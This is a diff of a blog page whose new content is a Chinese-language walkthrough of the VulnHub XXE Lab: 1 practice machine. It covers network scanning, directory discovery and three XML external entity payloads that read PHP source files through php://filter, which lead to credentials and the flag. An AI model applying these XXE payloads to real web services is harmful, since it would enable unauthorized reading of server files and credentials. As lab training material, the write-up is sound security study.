@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
-        <title>Archives | 剣の魔王の小屋</title>
+        <title>剣の魔王の小屋</title>
         <meta name="author" content="剣の魔王">
         <meta name="description" content="这个网站没有描述">
         <meta name="keywords" content="">
@@ -120,149 +120,81 @@
                     </div>
                     <div id="main">
                         
+<div class="article">
+    <div>
+        <h1> </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2023/9/27
+        </span>
+        
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="关于Vulnhub里的xxelab1过关"><a href="#关于Vulnhub里的xxelab1过关" class="headerlink" title="关于Vulnhub里的xxelab1过关"></a>关于Vulnhub里的xxelab1过关</h1><p>ps:跟着小迪老师的视频过的关</p>
+<p>靶机下载链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/xxe-lab-1,254/">XXE Lab: 1 ~ VulnHub</a></p>
+<p>由于靶机打开后是要登录的，然而设计者并没有给登录密码，所以ip地址未知</p>
+<p>因此先用nmap对网段进行扫描</p>
+<pre><code>nmap -sS 192.168.145.1/24
+</code></pre>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\1.png" alt="image:1245458574"></p>
+<p>发现可疑ip，尝试访问并且访问成功，网页本身没什么可疑点，所以对网站进行目录文件扫描</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\13.png" alt="image:785485857"></p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\12.png" alt="image:7854858547"></p>
+<p>发现robots.txt文件，并访问</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\2.png" alt="image:785485847"></p>
+<p>存在xxe目录和admin.php文件</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\6.png" alt="image:78548584785"></p>
+<p>登录并抓包</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\8.png" alt="image:785485487387"></p>
+<p>从Conten-Type或者数据格式类型可以判断存在xxe漏洞</p>
+<p>（数据格式类型判断:<user>text</user><pass>Mikasa</pass></p>
+<p> Content-Type值判断：text/xml,appliacation/xml）</p>
+<p>将包发送到Repeater上尝试用payload进行攻击</p>
+<pre><code>payload：
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;
+</code></pre>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\4.png" alt="image:7854854524"></p>
+<p>得到的base64加密数据发送到Decoder下解码，但是我看不出什么来，继续读取admin.php内容，并且继续解码</p>
+<pre><code>payload:
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;
+</code></pre>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\10.png" alt="image:752486548"></p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\11.png" alt="image:7524865157"></p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\9.png" alt="image:752486158"></p>
+<p>解码后发现登录账号和密码，但是密码是采用md5加密所以直接解密，尝试登录一下</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\5.png" alt="image:752484878"></p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\14.png" alt="image:75248489"></p>
+<p>点击flag后跳转到了一个Not Found 的网页，继续使用payload读取内容并解码，注意此时是在根目录，而之前是在xxe的目录下，所以需要使用./来跳转</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\15.png" alt="image:752481528"></p>
+<pre><code>payload:
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flagmeout.php&quot;&gt;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;
+</code></pre>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\7.png" alt="image:752481525"></p>
+<p>解码后就得到flag了</p>
+<p><img src="/2023/09/27/vulnhub-xxelab1-writeup/学习\wp\3.png" alt="image:75248152"></p>
 
-<div id="archives">
-    
-    
-    <div class="timeline" path="/2023/09/29/ctfhub-JWT/" style="z-index: 10">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2023/9/29</div>
-            <a href="/2023/09/29/ctfhub-JWT/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
     </div>
     
-    <div class="timeline" path="/2023/09/27/vulnhub-xxelab1-writeup/" style="z-index: 9">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2023/9/27</div>
-            <a href="/2023/09/27/vulnhub-xxelab1-writeup/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
-    
-    <div class="timeline" path="/2023/09/26/XXE/" style="z-index: 8">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2023/9/26</div>
-            <a href="/2023/09/26/XXE/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
-    
-    <div class="timeline" path="/2022/11/23/实验三 XSS和SQL注入/" style="z-index: 7">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2022/11/23</div>
-            <a href="/2022/11/23/实验三 XSS和SQL注入/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
-    
-    <div class="timeline" path="/2022/11/23/实验四 CTF实践/" style="z-index: 6">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2022/11/23</div>
-            <a href="/2022/11/23/实验四 CTF实践/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
-    
-    <div class="timeline" path="/2022/11/23/实验二 网络嗅探与身份认证/" style="z-index: 5">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2022/11/23</div>
-            <a href="/2022/11/23/实验二 网络嗅探与身份认证/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
-    
-    <div class="timeline" path="/2022/11/23/实验一 网络扫描与网络侦察/" style="z-index: 4">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2022/11/23</div>
-            <a href="/2022/11/23/实验一 网络扫描与网络侦察/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
-    
-    <div class="timeline" path="/2022/11/23/手机和PC连接同一热点，捕获TCP流/" style="z-index: 3">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2022/11/23</div>
-            <a href="/2022/11/23/手机和PC连接同一热点，捕获TCP流/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
-    
-    <div class="timeline" path="/2022/11/23/Kali Linux桥接、NAT模式与主机IP的关系/" style="z-index: 2">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2022/11/23</div>
-            <a href="/2022/11/23/Kali Linux桥接、NAT模式与主机IP的关系/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
-    
-    <div class="timeline" path="/2022/11/23/ZoomEye与Google Hacking/" style="z-index: 1">
-        <div class="timeline-tail"></div>
-        <div class="timeline-content">
-            <div class="item-time">2022/11/23</div>
-            <a href="/2022/11/23/ZoomEye与Google Hacking/">
-                <h3></h3>
-            </a>
-            <div class="info">
-                
-                
-            </div>
-        </div>
-    </div>
     
 </div>
                          
